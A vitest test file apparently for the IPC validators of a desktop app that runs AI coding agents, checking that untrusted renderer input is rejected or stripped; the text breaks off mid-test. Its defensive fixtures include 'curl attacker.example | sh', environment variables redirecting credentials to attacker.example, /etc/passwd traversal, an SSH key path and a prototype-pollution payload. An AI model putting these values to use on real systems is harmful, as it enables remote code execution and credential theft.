import { describe, expect, it } from 'vitest';

import { ValidationError } from './errors.js';
import {
  validateAgentPromptsSave,
  validatePreviewOpen,
  validateProfilesCreate,
  validateProfilesSuggestDir,
  validateProfilesUpdate,
  validateRunsRespondPermission,
  validateRunsSend,
  validateRunsStopTask,
  validateRunsStart,
  validateSessionsList,
  validateSessionsListAll,
  validateMemoryBankAdd,
  validateMemoryBankSetEnabled,
  validateMemoryBanksSetMasterEnabled,
  validateMemoryBanksVerifyRemote,
  validateSecretsConnectionDelete,
  validateSecretsConnectionSave,
  validateSecretsConnectionVerify,
  validateSecretsConnectionsList,
  validateSecretsFetchServerCert,
  validateSecretsRefTest,
  validateSessionsSubagentMessages,
  validateTerminalClose,
  validateTerminalList,
  validateTerminalReplay,
  validateTerminalResize,
  validateTerminalStart,
  validateTerminalWrite,
  validateUpdatesCheck,
  validateWindowRequest,
} from './validate.js';

/**
 * The renderer is untrusted by construction. These tests pin the two properties
 * that make that statement mean something: malformed input is rejected, and
 * *well-formed input with extra fields attached* is stripped rather than
 * forwarded.
 */

const VALID_RUN = {
  providerId: 'claude',
  profileId: 'p1',
  cwd: '/Users/someone/project',
  prompt: 'hello',
};

describe('validateRunsStart', () => {
  it('accepts a minimal run', () => {
    const result = validateRunsStart({ input: VALID_RUN });
    expect(result.input.providerId).toBe('claude');
    expect(result.input.cwd).toBe('/Users/someone/project');
  });

  it('rejects a relative cwd', () => {
    expect(() => validateRunsStart({ input: { ...VALID_RUN, cwd: '../elsewhere' } })).toThrow(ValidationError);
  });

  it('rejects an unknown provider', () => {
    expect(() => validateRunsStart({ input: { ...VALID_RUN, providerId: 'gpt' } })).toThrow(ValidationError);
  });

  it('rejects an unknown permission mode rather than downgrading it', () => {
    expect(() => validateRunsStart({ input: { ...VALID_RUN, permissionMode: 'yolo' } })).toThrow(ValidationError);
  });

  it('carries the whole resume surface through, field for field', () => {
    // `compact` copies exactly the keys written in the whitelist — an absent
    // line is a field that silently vanishes on its way through IPC. That is
    // precisely how rewind shipped broken: `rewindToMessageId` survived the
    // renderer, died here, and the run resumed the full conversation while
    // the screen showed the cut. This pin is the one that would have caught
    // it, so every sibling field rides along.
    const result = validateRunsStart({
      input: {
        ...VALID_RUN,
        resumeSessionId: 'sess-abc',
        forkSession: true,
        rewindToMessageId: 'a4f0c2d1-9b8e-4c1d-9f00-1234567890ab',
      },
    });
    expect(result.input.resumeSessionId).toBe('sess-abc');
    expect(result.input.forkSession).toBe(true);
    expect(result.input.rewindToMessageId).toBe('a4f0c2d1-9b8e-4c1d-9f00-1234567890ab');
  });

  it('drops fields the contract does not define', () => {
    // The interesting case: a renderer trying to reach past the contract into
    // the Claude Agent SDK's own `Options`.
    const result = validateRunsStart({
      input: {
        ...VALID_RUN,
        allowDangerouslySkipPermissions: true,
        pathToClaudeCodeExecutable: '/tmp/evil',
        env: { ANTHROPIC_API_KEY: 'sk-attacker' },
      },
    });
    expect(Object.keys(result.input).sort()).toEqual(['cwd', 'profileId', 'prompt', 'providerId']);
  });

  it('accepts an empty prompt, which is how a resumed session continues', () => {
    expect(() => validateRunsStart({ input: { ...VALID_RUN, prompt: '' } })).not.toThrow();
  });

  it('rejects an id that is really a path', () => {
    expect(() => validateRunsStart({ input: { ...VALID_RUN, profileId: '../../etc/passwd' } })).toThrow(
      ValidationError,
    );
  });

  it('rejects a prototype-polluting metadata key', () => {
    const result = validateRunsStart({
      input: { ...VALID_RUN, metadata: JSON.parse('{"__proto__":{"polluted":true},"tab":"a"}') as object },
    });
    expect(result.input.metadata).toEqual({ tab: 'a' });
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
  });
});

/**
 * Attachments.
 *
 * The renderer enforces every one of these limits before the send, so a user
 * never meets them. These tests are about the other caller — a renderer that
 * has been compromised, or a bug — because this is the last place a payload can
 * be refused before it is written to a file and billed to an account.
 */
describe('attachments', () => {
  /** A 1×1 PNG. Small, real, and decodes. */
  const PNG =
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';

  /** Well-formed base64 decoding to roughly `bytes`, for the size ceilings. */
  const payload = (bytes: number): string => 'A'.repeat(Math.ceil(bytes / 3) * 4);

  const image = (over: Record<string, unknown> = {}): Record<string, unknown> => ({
    kind: 'image',
    id: 'img_1',
    mediaType: 'image/png',
    data: PNG,
    ...over,
  });

  it('accepts a stop aimed at one task of one run', () => {
    const stop = validateRunsStopTask({ runId: 'run_1', taskId: 'b5hyzk8n3' });
    expect(stop).toEqual({ runId: 'run_1', taskId: 'b5hyzk8n3' });
  });

  it('refuses a stop with no task to aim at', () => {
    // Both ids are required: the run is how the main process finds the provider
    // holding the task, and a request missing either would be a stop aimed at
    // whatever the handler happened to resolve.
    expect(() => validateRunsStopTask({ runId: 'run_1' })).toThrow(ValidationError);
    expect(() => validateRunsStopTask({ taskId: 'b5hyzk8n3' })).toThrow(ValidationError);
    expect(() => validateRunsStopTask({ runId: 'run_1', taskId: 42 })).toThrow(ValidationError);
  });

  it('accepts an image on a run and on a mid-run send', () => {
    const started = validateRunsStart({ input: { ...VALID_RUN, attachments: [image()] } });
    expect(started.input.attachments).toHaveLength(1);
    expect(started.input.attachments?.[0]?.mediaType).toBe('image/png');

    const sent = validateRunsSend({ runId: 'run_1', text: 'look', attachments: [image()] });
    expect(sent.attachments).toHaveLength(1);
  });

  it('treats an empty list as no attachments at all', () => {
    // So `compact` drops the key rather than forwarding `[]`, which an adapter
    // would otherwise have to distinguish from "none" for no reason.
    expect(validateRunsStart({ input: { ...VALID_RUN, attachments: [] } }).input.attachments).toBeUndefined();
  });

  it('rejects a media type no provider reads', () => {
    // SVG is the one worth naming: it is a document that can carry script, and
    // it is the format someone would most plausibly try.
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [image({ mediaType: 'image/svg+xml' })] } }),
    ).toThrow(ValidationError);
  });

  it('rejects a data: prefix rather than quietly stripping it', () => {
    expect(() =>
      validateRunsStart({
        input: { ...VALID_RUN, attachments: [image({ data: `data:image/png;base64,${PNG}` })] },
      }),
    ).toThrow(ValidationError);
  });

  it('rejects payloads that are not base64', () => {
    // `Buffer.from(…, 'base64')` would accept all of these by discarding what
    // it could not read, which is why the check is on the shape.
    for (const data of ['not base64!!', 'iVBO=RwLA', 'abcde', 'ab==cd==', 'aGVs bG8=']) {
      expect(() =>
        validateRunsStart({ input: { ...VALID_RUN, attachments: [image({ data })] } }),
      ).toThrow(ValidationError);
    }
  });

  it('validates a large payload without blowing the stack', () => {
    // The regression: the first version of this check used a `{4}`-group inside
    // a `*`, which makes V8 push a backtracking frame per repetition. It threw
    // `RangeError: Maximum call stack size exceeded` instead of validating —
    // invisible while five megabytes of image was the largest payload, and
    // immediately fatal once files could be 32MB.
    expect(() =>
      validateRunsStart({
        input: { ...VALID_RUN, attachments: [doc({ data: payload(8 * 1024 * 1024) })] },
      }),
    ).not.toThrow();
  });

  it('rejects an image over the per-image ceiling', () => {
    expect(() =>
      validateRunsStart({
        input: { ...VALID_RUN, attachments: [image({ data: payload(8 * 1024 * 1024) })] },
      }),
    ).toThrow(ValidationError);
  });

  it('rejects more images than a prompt can carry', () => {
    const five = Array.from({ length: 5 }, (_, index) => image({ id: `img_${String(index)}` }));
    expect(() => validateRunsStart({ input: { ...VALID_RUN, attachments: five } })).toThrow(ValidationError);
  });

  it('rejects two attachments sharing an id', () => {
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [image(), image()] } }),
    ).toThrow(ValidationError);
  });

  it('rejects an id that is really a path', () => {
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [image({ id: '../../etc/passwd' })] } }),
    ).toThrow(ValidationError);
  });

  it('drops a caller-supplied path', () => {
    // The shape the protocol deliberately does not have. A renderer that sends
    // one is asking the main process to read a file of its choosing.
    const result = validateRunsStart({
      input: { ...VALID_RUN, attachments: [image({ path: '/Users/someone/.ssh/id_rsa' })] },
    });
    expect(result.input.attachments?.[0]).not.toHaveProperty('path');
  });

  it('keeps a filename as a label but caps its length', () => {
    const named = validateRunsStart({
      input: { ...VALID_RUN, attachments: [image({ name: 'shot.png' })] },
    });
    expect(named.input.attachments?.[0]?.name).toBe('shot.png');

    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [image({ name: 'x'.repeat(500) })] } }),
    ).toThrow(ValidationError);
  });

  it('rejects a kind that is neither', () => {
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [image({ kind: 'audio' })] } }),
    ).toThrow(ValidationError);
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: ['not an object'] } }),
    ).toThrow(ValidationError);
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: { 0: image() } } }),
    ).toThrow(ValidationError);
  });

  /**
   * Files.
   *
   * The interesting difference from an image is `name`: an image's is a label
   * nothing depends on, but a file's decides what the staged file is *called*,
   * which makes it the one field here that can be shaped into a path. It is
   * required, capped and NUL-checked here; `safeFileName` in core reduces it to
   * a single path component before anything opens it. Two layers, because the
   * consequence of getting it wrong is a write outside the staging directory.
   */
  const doc = (over: Record<string, unknown> = {}): Record<string, unknown> => ({
    kind: 'file',
    id: 'file_1',
    name: 'notes.md',
    data: PNG,
    ...over,
  });

  it('accepts a file of any format, with no allow-list', () => {
    // The point of the feature: the agent has Read, Grep and a shell, so the
    // formats it can use are wider than any list here would stay current with.
    for (const name of ['a.csv', 'b.parquet', 'c.sqlite', 'd', 'e.tar.gz', 'f.xyz']) {
      const result = validateRunsStart({
        input: { ...VALID_RUN, attachments: [doc({ name })] },
      });
      expect(result.input.attachments?.[0]).toMatchObject({ kind: 'file', name });
    }
  });

  it('requires a file to be named, because the staged file takes that name', () => {
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [doc({ name: undefined })] } }),
    ).toThrow(ValidationError);
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [doc({ name: '' })] } }),
    ).toThrow(ValidationError);
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [doc({ name: 'x'.repeat(500) })] } }),
    ).toThrow(ValidationError);
  });

  it('rejects a NUL in a filename, which truncates a path downstream', () => {
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [doc({ name: "a\u0000.png" })] } }),
    ).toThrow(ValidationError);
  });

  it('passes a traversing name through to the core sanitizer rather than guessing', () => {
    // Deliberately *not* rejected here. `../../etc/passwd` is a legal filename
    // string, and the layer that turns a name into a path is the layer that
    // knows how to make it safe — see `safeFileName`. Rejecting here would also
    // reject a file the user legitimately named `..config`.
    const result = validateRunsStart({
      input: { ...VALID_RUN, attachments: [doc({ name: '../../etc/passwd' })] },
    });
    expect(result.input.attachments?.[0]).toMatchObject({ name: '../../etc/passwd' });
  });

  it('gives files a larger ceiling than images, and enforces both', () => {
    // An image's bytes become tokens; a file's become a file. 8MB is over the
    // image limit and well under the file one.
    const eightMb = payload(8 * 1024 * 1024);
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [image({ data: eightMb })] } }),
    ).toThrow(ValidationError);
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [doc({ data: eightMb })] } }),
    ).not.toThrow();
    // …and the file ceiling is real too.
    expect(() =>
      validateRunsStart({
        input: { ...VALID_RUN, attachments: [doc({ data: payload(40 * 1024 * 1024) })] },
      }),
    ).toThrow(ValidationError);
  });

  it('counts the two kinds separately', () => {
    // Four images and ten files is the maximum of each; a full image strip must
    // not consume a file's slot.
    const many = [
      ...Array.from({ length: 4 }, (_, i) => image({ id: `img_${String(i)}` })),
      ...Array.from({ length: 10 }, (_, i) => doc({ id: `file_${String(i)}` })),
    ];
    expect(validateRunsStart({ input: { ...VALID_RUN, attachments: many } }).input.attachments)
      .toHaveLength(14);

    expect(() =>
      validateRunsStart({
        input: { ...VALID_RUN, attachments: [...many, image({ id: 'img_extra' })] },
      }),
    ).toThrow(ValidationError);
    expect(() =>
      validateRunsStart({
        input: { ...VALID_RUN, attachments: [...many, doc({ id: 'file_extra' })] },
      }),
    ).toThrow(ValidationError);
  });

  it('keeps a media type when given one and omits it when not', () => {
    const withType = validateRunsStart({
      input: { ...VALID_RUN, attachments: [doc({ mediaType: 'application/pdf' })] },
    });
    expect(withType.input.attachments?.[0]).toMatchObject({ mediaType: 'application/pdf' });

    // Browsers hand over an empty string for anything they do not recognise.
    const without = validateRunsStart({
      input: { ...VALID_RUN, attachments: [doc({ mediaType: undefined })] },
    });
    expect(without.input.attachments?.[0]).not.toHaveProperty('mediaType');
  });

  it('applies the same base64 rules to a file as to an image', () => {
    expect(() =>
      validateRunsStart({ input: { ...VALID_RUN, attachments: [doc({ data: 'not base64!!' })] } }),
    ).toThrow(ValidationError);
    expect(() =>
      validateRunsStart({
        input: { ...VALID_RUN, attachments: [doc({ data: `data:text/csv;base64,${PNG}` })] },
      }),
    ).toThrow(ValidationError);
  });
});

describe('validateProfilesCreate', () => {
  it('accepts a first-party draft', () => {
    const result = validateProfilesCreate({
      draft: { label: 'Work', providerId: 'claude', configDir: '  /Users/me/.claude  ' },
    });
    expect(result.draft.label).toBe('Work');
    // Trimmed, because a pasted path routinely arrives with whitespace.
    expect(result.draft.configDir).toBe('/Users/me/.claude');
  });

  it('requires a config directory', () => {
    // No default. A profile with no directory has no account and no history,
    // and guessing one on the user's behalf is what the old scheme did.
    expect(() => validateProfilesCreate({ draft: { label: 'Work', providerId: 'claude' } })).toThrow(
      ValidationError,
    );
  });

  it('rejects a relative config directory', () => {
    // The path is resolved by a child process whose working directory is not
    // the user's, so a relative one means somewhere nobody intended.
    expect(() =>
      validateProfilesCreate({ draft: { label: 'W', providerId: 'claude', configDir: '.claude' } }),
    ).toThrow(ValidationError);
  });

  it('rejects a config directory that traverses upward', () => {
    expect(() =>
      validateProfilesCreate({
        draft: { label: 'W', providerId: 'claude', configDir: '/Users/me/../../etc' },
      }),
    ).toThrow(ValidationError);
  });

  it('rejects the filesystem root', () => {
    expect(() =>
      validateProfilesCreate({ draft: { label: 'W', providerId: 'claude', configDir: '/' } }),
    ).toThrow(ValidationError);
  });

  it('rejects a tilde rather than creating a directory literally named "~"', () => {
    // Nothing in Artemis expands `~`; a child process would receive it verbatim.
    expect(() =>
      validateProfilesCreate({
        draft: { label: 'W', providerId: 'claude', configDir: '~/.claude' },
      }),
    ).toThrow(ValidationError);
  });

  it('normalises a colour, and rejects one that is not hex', () => {
    const result = validateProfilesCreate({
      draft: {
        label: 'Work',
        providerId: 'claude',
        configDir: '/Users/me/.claude',
        color: '#ABC',
      },
    });
    expect(result.draft.color).toBe('#aabbcc');

    // Rejected rather than dropped: silently discarding it would show the user
    // a colour they picked and save a profile without it.
    expect(() =>
      validateProfilesCreate({
        draft: {
          label: 'Work',
          providerId: 'claude',
          configDir: '/Users/me/.claude',
          color: 'url(javascript:alert(1))',
        },
      }),
    ).toThrow(ValidationError);
  });

  it('rejects a credential hiding in publicEnv', () => {
    // `publicEnv` is persisted unencrypted, so this has to fail before it is
    // written anywhere.
    expect(() =>
      validateProfilesCreate({
        draft: {
          label: 'Work',
          providerId: 'claude',
          configDir: '/Users/me/.claude',
          publicEnv: { ANTHROPIC_AUTH_TOKEN: 'nope' },
        },
      }),
    ).toThrow(ValidationError);
  });

  it('rejects publicEnv that would point the credential elsewhere', () => {
    // The renderer is untrusted by construction. `ANTHROPIC_BASE_URL` carries
    // no secret and passes the credential-name check, but the provider CLI will
    // send the credential from its config directory to whatever endpoint it is
    // aimed at — so a renderer that could set it would redirect a real token.
    for (const key of [
      'ANTHROPIC_BASE_URL',
      'ANTHROPIC_CUSTOM_HEADERS',
      'HTTPS_PROXY',
      'http_proxy',
      'NODE_OPTIONS',
      'NODE_EXTRA_CA_CERTS',
    ]) {
      expect(() =>
        validateProfilesCreate({
          draft: {
            label: 'Work',
            providerId: 'claude',
            configDir: '/Users/me/.claude',
            publicEnv: { [key]: 'https://attacker.example' },
          },
        }),
      ).toThrow(ValidationError);
    }
  });

  it('rejects a redirecting publicEnv on update too', () => {
    expect(() =>
      validateProfilesUpdate({
        id: 'p1',
        patch: { publicEnv: { ANTHROPIC_BASE_URL: 'https://attacker.example' } },
      }),
    ).toThrow(ValidationError);
  });

  it('allows genuinely non-sensitive env vars', () => {
    const result = validateProfilesCreate({
      draft: {
        label: 'Work',
        providerId: 'claude',
        configDir: '/Users/me/.claude',
        publicEnv: { AWS_REGION: 'us-east-1' },
      },
    });
    expect(result.draft.publicEnv).toEqual({ AWS_REGION: 'us-east-1' });
  });

  it('drops a field the renderer did not send', () => {
    // Payloads are rebuilt rather than passed through, so an extra property
    // cannot ride along into the engine.
    const result = validateProfilesCreate({
      draft: {
        label: 'W',
        providerId: 'claude',
        configDir: '/Users/me/.claude',
        somethingElse: 'nope',
      },
    });
    expect('somethingElse' in result.draft).toBe(false);
  });

  it('drops a key sent for a provider that signs in to an account', () => {
    /*
     * `apiKey` is a real field now — a local server's key, for the providers
     * that are an address rather than an account. It stays impossible for the
     * hosted ones, and this is the same guard the old assertion made when the
     * field did not exist at all: Artemis holds no vendor credential, and one
     * accepted here would be encrypted, stored, and never sent by anything.
     */
    const result = validateProfilesCreate({
      draft: {
        label: 'W',
        providerId: 'claude',
        configDir: '/Users/me/.claude',
        apiKey: 'sk-ant-nope',
        baseUrl: 'http://attacker.example',
      },
    });
    expect('apiKey' in result.draft).toBe(false);
    expect('baseUrl' in result.draft).toBe(false);
  });

  it('keeps both for a provider that is an address', () => {
    const result = validateProfilesCreate({
      draft: {
        label: 'Local',
        providerId: 'llamacpp',
        configDir: '/Users/me/.artemis-local',
        baseUrl: 'http://192.168.1.40:9090/',
        apiKey: 'hunter2',
      },
    });
    // Stored in one spelling, so a trailing slash cannot make two profiles
    // that differ by a character nobody can see.
    expect(result.draft.baseUrl).toBe('http://192.168.1.40:9090');
    expect(result.draft.apiKey).toBe('hunter2');
  });

  it('refuses an address that cannot work rather than saving a profile that cannot connect', () => {
    for (const baseUrl of ['127.0.0.1:8080', 'ws://x', 'http://user:pw@host']) {
      expect(() =>
        validateProfilesCreate({
          draft: {
            label: 'Local',
            providerId: 'llamacpp',
            configDir: '/Users/me/.artemis-local',
            baseUrl,
          },
        }),
      ).toThrow(ValidationError);
    }
  });
});

describe('validateProfilesUpdate', () => {
  it('carries a config-directory change through', () => {
    const result = validateProfilesUpdate({ id: 'p1', patch: { configDir: '/Users/me/other' } });
    expect(result.patch.configDir).toBe('/Users/me/other');
  });

  it('omits configDir entirely when absent, which means "leave it alone"', () => {
    const result = validateProfilesUpdate({ id: 'p1', patch: { label: 'Renamed' } });
    expect('configDir' in result.patch).toBe(false);
  });

  it('rejects a malformed config directory on update', () => {
    expect(() => validateProfilesUpdate({ id: 'p1', patch: { configDir: 'relative' } })).toThrow(
      ValidationError,
    );
  });

  it('keeps an empty colour as the empty string, which is how a patch clears it', () => {
    // Coercing it to `undefined` here would turn "remove the colour" into
    // "leave it alone", and the swatch would come back after every save.
    const cleared = validateProfilesUpdate({ id: 'p1', patch: { color: '' } });
    expect(cleared.patch.color).toBe('');

    const untouched = validateProfilesUpdate({ id: 'p1', patch: { label: 'Renamed' } });
    expect('color' in untouched.patch).toBe(false);
  });

  it('carries both availability flags through, in either direction', () => {
    const off = validateProfilesUpdate({
      id: 'p1',
      patch: { autoSelect: false, disabled: true },
    });
    expect(off.patch.autoSelect).toBe(false);
    expect(off.patch.disabled).toBe(true);

    // `true`/`false` is how the form says "back to normal" — there is no
    // clearing vocabulary for a boolean with a default — so both values have to
    // survive rather than only the interesting one.
    const on = validateProfilesUpdate({ id: 'p1', patch: { autoSelect: true, disabled: false } });
    expect(on.patch.autoSelect).toBe(true);
    expect(on.patch.disabled).toBe(false);

    const untouched = validateProfilesUpdate({ id: 'p1', patch: { label: 'Renamed' } });
    expect('disabled' in untouched.patch).toBe(false);
  });

  it('refuses a non-boolean availability flag rather than coercing it', () => {
    // Coercion is the failure worth ruling out: a truthy `"false"` would hide
    // an account from the picker, and the user would have asked for the
    // opposite.
    expect(() => validateProfilesUpdate({ id: 'p1', patch: { disabled: 'true' } })).toThrow(
      ValidationError,
    );
    expect(() => validateProfilesUpdate({ id: 'p1', patch: { autoSelect: 0 } })).toThrow(
      ValidationError,
    );
  });
});

describe('validateProfilesSuggestDir', () => {
  it('accepts a partial label, because the form asks while the user is typing', () => {
    expect(validateProfilesSuggestDir({ label: 'Wo' })).toEqual({ label: 'Wo' });
  });

  it('accepts an empty request rather than refusing the first keystroke', () => {
    expect(validateProfilesSuggestDir({})).toEqual({ label: '' });
  });

  it('rejects a non-string label', () => {
    expect(() => validateProfilesSuggestDir({ label: 42 })).toThrow(ValidationError);
  });
});

describe('validateRunsRespondPermission', () => {
  it('accepts an allow with a persisted rule', () => {
    const result = validateRunsRespondPermission({
      runId: 'r1',
      requestId: 'q1',
      decision: {
        behavior: 'allow',
        scope: 'project',
        updatedPermissions: [
          { type: 'addRules', behavior: 'allow', scope: 'project', rules: [{ toolName: 'Bash', ruleContent: 'git:*' }] },
        ],
      },
    });
    expect(result.decision.behavior).toBe('allow');
  });

  it('rejects an unknown scope', () => {
    expect(() =>
      validateRunsRespondPermission({
        runId: 'r1',
        requestId: 'q1',
        decision: { behavior: 'allow', scope: 'forever' },
      }),
    ).toThrow(ValidationError);
  });

  it('rejects the SDK-only cliArg destination, which Artemis must never produce', () => {
    expect(() =>
      validateRunsRespondPermission({
        runId: 'r1',
        requestId: 'q1',
        decision: {
          behavior: 'allow',
          updatedPermissions: [{ type: 'setMode', mode: 'bypassPermissions', scope: 'cliArg' }],
        },
      }),
    ).toThrow(ValidationError);
  });

  it('rejects a decision that is neither allow nor deny', () => {
    expect(() =>
      validateRunsRespondPermission({ runId: 'r1', requestId: 'q1', decision: { behavior: 'maybe' } }),
    ).toThrow(ValidationError);
  });
});

describe('validateSessionsList', () => {
  it('requires the profile, because history is per-profile', () => {
    expect(() => validateSessionsList({ providerId: 'claude', cwd: '/a' })).toThrow(ValidationError);
  });

  it('bounds pagination', () => {
    expect(() =>
      validateSessionsList({ providerId: 'claude', profileId: 'p1', cwd: '/a', limit: 10_000_000 }),
    ).toThrow(ValidationError);
  });
});

/**
 * The aggregated listing. The property worth pinning is the *default*: an
 * omitted limit once meant "the entire merged history", which on a heavy
 * account is a response big enough to trip the IPC leak scanner's node budget
 * and fail closed as a false credential-safety error. This boundary now always
 * forwards a bounded page.
 */
describe('validateSessionsListAll', () => {
  it('fills in a default page size when limit is omitted', () => {
    expect(validateSessionsListAll({}).limit).toBe(500);
    expect(validateSessionsListAll(undefined).limit).toBe(500);
  });

  it('keeps an explicit limit that is within bounds', () => {
    expect(validateSessionsListAll({ limit: 25 }).limit).toBe(25);
    expect(validateSessionsListAll({ limit: 1_000 }).limit).toBe(1_000);
  });

  it('rejects a limit past the page cap rather than forwarding it', () => {
    expect(() => validateSessionsListAll({ limit: 10_000_000 })).toThrow(ValidationError);
    expect(() => validateSessionsListAll({ limit: 0 })).toThrow(ValidationError);
  });

  it('rejects an unknown provider filter and accepts none at all', () => {
    expect(() => validateSessionsListAll({ providerId: 'gpt' })).toThrow(ValidationError);
    expect(validateSessionsListAll({}).providerId).toBeUndefined();
  });
});

/**
 * The window channels are the one place where "rebuilt, not passed through" is
 * load-bearing on its own rather than as defence in depth.
 *
 * Their handlers act on `context.window` — the window the message came from —
 * and they are reachable by any renderer. If a field ever survived this
 * validator, the next person to add a `windowId` to the handler would have
 * built a way for one window to close another without noticing they had.
 */
describe('validateWindowRequest', () => {
  it('accepts an empty request', () => {
    expect(validateWindowRequest({})).toEqual({});
  });

  it('drops every field, including one that names another window', () => {
    const smuggled = validateWindowRequest({ windowId: 7, webContentsId: 3, force: true });
    expect(smuggled).toEqual({});
  });

  it('rejects a payload that is not an object', () => {
    expect(() => validateWindowRequest('close')).toThrow(ValidationError);
  });

  it('treats a missing payload as empty, like every other channel', () => {
    expect(validateWindowRequest(undefined)).toEqual({});
  });
});

/**
 * The update check is the one update channel that reaches the network, so what
 * it must never accept is a way to say *where*.
 *
 * There is no such field today, and these tests are what keeps that true: a
 * later `feedUrl` or `tag` added to the request type would have to be added
 * here too, which is exactly the moment somebody should have to argue for
 * letting a renderer point the privileged process at a URL of its choosing.
 */
describe('validateUpdatesCheck', () => {
  it('accepts an empty request', () => {
    expect(validateUpdatesCheck({})).toEqual({});
  });

  it('drops every field, including one that would aim the check somewhere', () => {
    const smuggled = validateUpdatesCheck({
      feedUrl: 'https://example.invalid/latest-mac.yml',
      tag: 'v9.9.9',
      channel: 'beta',
      manual: true,
    });
    expect(smuggled).toEqual({});
  });

  it('rejects a payload that is not an object', () => {
    expect(() => validateUpdatesCheck('check')).toThrow(ValidationError);
  });

  it('treats a missing payload as empty, like every other channel', () => {
    expect(validateUpdatesCheck(undefined)).toEqual({});
  });
});

/**
 * The preview channel takes a path out of model output and hands it to a
 * function that reads the file, so it is the closest thing in the protocol to
 * "the renderer names a file and the main process opens it".
 *
 * What that makes worth pinning is narrow but important: the request is rebuilt
 * from one field, so nothing else the renderer attaches can reach `preview.ts`.
 * The interesting checks — what may be *rendered* — deliberately live there
 * rather than here, so these tests assert that this layer does not duplicate
 * them: a `.ts` path is accepted by the validator and refused by the handler,
 * with one sentence, from one place.
 */
describe('validatePreviewOpen', () => {
  it('accepts an absolute path', () => {
    expect(validatePreviewOpen({ path: '/tmp/report.html' })).toEqual({
      path: '/tmp/report.html',
    });
  });

  it('rejects a relative path, which the renderer resolves before asking', () => {
    expect(() => validatePreviewOpen({ path: 'out/report.html' })).toThrow(ValidationError);
  });

  it('rejects a missing path', () => {
    expect(() => validatePreviewOpen({})).toThrow(ValidationError);
    expect(() => validatePreviewOpen(undefined)).toThrow(ValidationError);
  });

  it('drops everything else, including a URL it might have preferred to serve', () => {
    const smuggled = validatePreviewOpen({
      path: '/tmp/report.html',
      url: 'https://example.com',
      mediaType: 'text/html',
    });
    expect(smuggled).toEqual({ path: '/tmp/report.html' });
  });

  it('leaves the extension rule to the layer that serves the bytes', () => {
    expect(validatePreviewOpen({ path: '/tmp/notes.ts' })).toEqual({ path: '/tmp/notes.ts' });
  });
});

/**
 * Terminals.
 *
 * The interesting one in this file, because a terminal is the only channel in
 * the contract that hands the renderer unmediated execution — so it is worth
 * being precise about which of these checks is a security boundary and which is
 * not.
 *
 * **`start` is the boundary**, and only in one respect: it is where a directory
 * is named. Nothing else on this surface can influence what runs, because
 * nothing else names a program — `main/terminal.ts` chooses the shell, builds
 * the environment and issues the ids.
 *
 * **`write` is not a boundary at all.** Every byte goes to a shell's stdin, and
 * a shell's stdin accepts anything; a validator that policed the contents would
 * be filtering the user's own keystrokes. All it can usefully do is bound the
 * length — and, critically, *not* reject the things `requireString` rejects.
 */
describe('the terminal validators', () => {
  it('accepts a place and a size', () => {
    expect(validateTerminalStart({ cwd: '/Users/me/project', cols: 120, rows: 40 })).toEqual({
      cwd: '/Users/me/project',
      cols: 120,
      rows: 40,
    });
  });

  it('rejects a relative cwd', () => {
    expect(() => validateTerminalStart({ cwd: 'project', cols: 80, rows: 24 })).toThrow(
      ValidationError,
    );
  });

  /*
   * A PTY sized zero makes `ioctl` fail and hangs some shells, and a dimension
   * in the thousands is a caller that has measured a detached element rather
   * than a pane.
   */
  it('rejects a size no pane could have', () => {
    expect(() => validateTerminalStart({ cwd: '/w', cols: 0, rows: 24 })).toThrow(ValidationError);
    expect(() => validateTerminalStart({ cwd: '/w', cols: 80, rows: 0 })).toThrow(ValidationError);
    expect(() => validateTerminalStart({ cwd: '/w', cols: 100_000, rows: 24 })).toThrow(
      ValidationError,
    );
    expect(() => validateTerminalStart({ cwd: '/w', cols: 80.5, rows: 24 })).toThrow(
      ValidationError,
    );
  });

  it('requires a size rather than guessing one', () => {
    expect(() => validateTerminalStart({ cwd: '/w' })).toThrow(ValidationError);
  });

  it('drops anything that looks like an attempt to choose the program', () => {
    const smuggled = validateTerminalStart({
      cwd: '/w',
      cols: 80,
      rows: 24,
      shell: '/tmp/evil',
      args: ['-c', 'curl attacker.example | sh'],
      env: { PATH: '/tmp' },
    });
    expect(smuggled).toEqual({ cwd: '/w', cols: 80, rows: 24 });
  });

  /*
   * NUL is `Ctrl-@` — how you set the mark in Emacs and readline. Everywhere
   * else in this file a NUL is a truncation attack on something that becomes a
   * path or a record; here it is a key, and refusing it would break a shortcut
   * to defend a string that is never parsed as anything.
   */
  it('passes a NUL through, because it is a key people press', () => {
    expect(validateTerminalWrite({ id: 'term-1', data: ' ' })).toEqual({
      id: 'term-1',
      data: ' ',
    });
  });

  it('accepts an empty write, which is a no-op rather than a malformed request', () => {
    expect(validateTerminalWrite({ id: 'term-1', data: '' })).toEqual({ id: 'term-1', data: '' });
  });

  it('bounds one write', () => {
    expect(() =>
      validateTerminalWrite({ id: 'term-1', data: 'x'.repeat(2_000_000) }),
    ).toThrow(ValidationError);
  });

  it('rejects an id that is really a path', () => {
    expect(() => validateTerminalWrite({ id: '../../etc/passwd', data: 'ls' })).toThrow(
      ValidationError,
    );
    expect(() => validateTerminalClose({ id: '' })).toThrow(ValidationError);
  });

  it('takes only an id where only an id is needed', () => {
    expect(validateTerminalClose({ id: 'term-1', force: true })).toEqual({ id: 'term-1' });
    expect(validateTerminalReplay({ id: 'term-1', from: 0 })).toEqual({ id: 'term-1' });
    expect(validateTerminalResize({ id: 'term-1', cols: 80, rows: 24 })).toEqual({
      id: 'term-1',
      cols: 80,
      rows: 24,
    });
  });

  it('takes nothing at all for a list', () => {
    expect(validateTerminalList({})).toEqual({});
